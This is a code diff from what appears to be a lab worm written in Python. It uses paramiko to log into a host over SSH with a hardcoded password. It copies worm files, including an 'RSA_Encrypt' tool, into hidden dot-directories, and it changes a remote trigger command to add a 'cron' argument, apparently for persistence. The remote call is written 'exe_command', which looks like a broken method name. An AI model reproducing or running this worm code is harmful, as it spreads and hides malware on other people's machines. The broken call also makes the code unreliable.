@@ -51,6 +51,7 @@ def Hiding(ip, password):
     sftp.put('/home/victim/Public/.Simple_Worm/Loop/Loop_ping', '/home/attacker/Public/.Simple_Worm/Loop_ping')
     sftp.put('/home/victim/Public/.Simple_Worm/Loop/task1_result.log', '/home/attacker/Public/.Simple_Worm/task1_result.log')
     sftp.put('/home/victim/Public/.Simple_Worm/Loop/trigger', '/home/attacker/Public/.Simple_Worm/trigger')
+
     sftp.put('/home/victim/materials/RSA/RSA_Encrypt', '/home/attacker/Desktop/.Backup/RSA_Encrypt')
     sftp.put('/home/victim/Public/.Simple_Worm/Loop/Loop_ping', '/home/attacker/Desktop/.Backup/Loop_ping')
     sftp.put('/home/victim/Public/.Simple_Worm/Loop/task1_result.log', '/home/attacker/Desktop/.Backup/task1_result.log')
@@ -61,6 +62,6 @@ def Trigger(ip, password):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     client.connect(ip, 22, username='attacker', password=password, timeout=1000, banner_timeout=1000, auth_timeout=1000)
-    client.exe_command('/home/attacker/Public/.Simple_Worm/trigger')
+    client.exe_command('/home/attacker/Public/.Simple_Worm/trigger cron')
 
 Hiding('127.0.0.1', 'YH0228')
